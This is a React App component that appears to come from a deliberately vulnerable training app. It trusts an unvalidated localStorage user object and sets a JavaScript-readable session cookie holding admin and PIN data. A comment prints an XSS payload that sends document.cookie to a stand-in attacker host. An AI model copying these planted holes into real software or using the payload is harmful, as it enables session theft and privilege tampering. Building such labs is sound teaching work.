import React, { useState, useEffect } from 'react';
import Login from './pages/Login.jsx';
import Dashboard from './pages/Dashboard.jsx';

const STORAGE_KEY = 'user';

export default function App() {
  const [user, setUser] = useState(null);

  // On load, restore whatever is sitting in localStorage. This is part
  // of the intentional design: nothing revalidates this against the
  // server, so if someone edits it by hand the app just believes it.
  useEffect(() => {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (raw) {
      try {
        setUser(JSON.parse(raw));
      } catch {
        localStorage.removeItem(STORAGE_KEY);
      }
    }
  }, []);

  function handleLogin(userData) {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(userData));

    // ======================================================================
    // VULNERABILITY: Session cookie set WITHOUT the HttpOnly flag.
    // ----------------------------------------------------------------------
    // A "session token" is written from client-side JavaScript, which means
    // it can never be HttpOnly and is fully readable via `document.cookie`.
    // Combined with the stored-XSS sink in the feed, an injected
    //     <script>fetch('https://ATTACKER/?c='+document.cookie)</script>
    // can exfiltrate this token to an attacker's webhook.
    // ======================================================================
    const sessionToken = btoa(
      JSON.stringify({
        uid: userData.id,
        username: userData.username,
        is_admin: userData.is_admin,
        pin: userData.encrypted_pin,
      })
    );
    // No HttpOnly (impossible from JS), no Secure — deliberately stealable.
    document.cookie = `session=${sessionToken}; path=/; SameSite=Lax; max-age=86400`;

    setUser(userData);
  }

  useEffect(() => {
    console.log(user);
  }, [user])

  function handleLogout() {
    localStorage.removeItem(STORAGE_KEY);
    document.cookie = "session=; path=/; max-age=0";
    setUser(null);
  }

  return user ? (
    <Dashboard user={user} onLogout={handleLogout} />
  ) : (
    <Login onLogin={handleLogin} />
  );
}
